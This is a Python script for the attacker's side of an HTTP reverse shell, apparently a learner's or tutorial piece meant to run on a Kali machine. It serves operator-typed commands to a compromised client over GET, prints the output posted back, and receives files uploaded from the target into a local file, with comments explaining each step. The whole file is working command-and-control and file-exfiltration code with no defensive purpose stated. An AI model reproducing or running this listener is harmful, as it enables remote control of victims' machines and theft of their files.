import http.server
import os,cgi

# kali ip and port 
HOST_NAME = '192.168.43.119'
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        # when we get request from client
        # with this function we command and send it back to the client
        command = input("SHELL>>")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())
        # wfile.write is send() in socket
        # wfile.write just send a command that we want to execute

    def do_POST(self):
        # after send command we expect client execute command and send the result  back with post
        if self.path == '/tmp':
            # this means that if we received with /store in usrl client and the content-type
            #  was multipart/form-data we want to receivr file from target and its not just a command
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('Content-type'))
                #print(ctype)
                if ctype == 'multipart/form-data':   # python use this for transfer data
                    # then we pass the file pointer(rfile) and the headers as well as request method to filedstorge class
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                            # rfile.read is recv() in reverse shell socket
                else:
                    print('[-] unexpected POST request')
                fs_up = fs['file']
                # we split and get the file tag value and store in fs_up
                # its tag that we mentioned it in client side in dictionary
                with open('/tmp/place_holder.txt', 'wb') as o:
                    # just dimple file to receive and store file binary
                    print('[+] writing file ...')
                    o.write(fs_up.file.read())
                    # inside the place holder we write received file: we reading incoming file and on the same time we write it
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            # finaly we exit function with return to prevent any conflict or mix up non file transfer post
            return
            ##########################################
            # down part is will handle the print out the command that execution
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        # rfile.read is recv() in reverse shell socket
        # we store command execution in postVar 
        print(postVar.decode())

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME,PORT_NUMBER), MyHandler)
    try:
        # start listening on port 80
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[-] server is terminate')
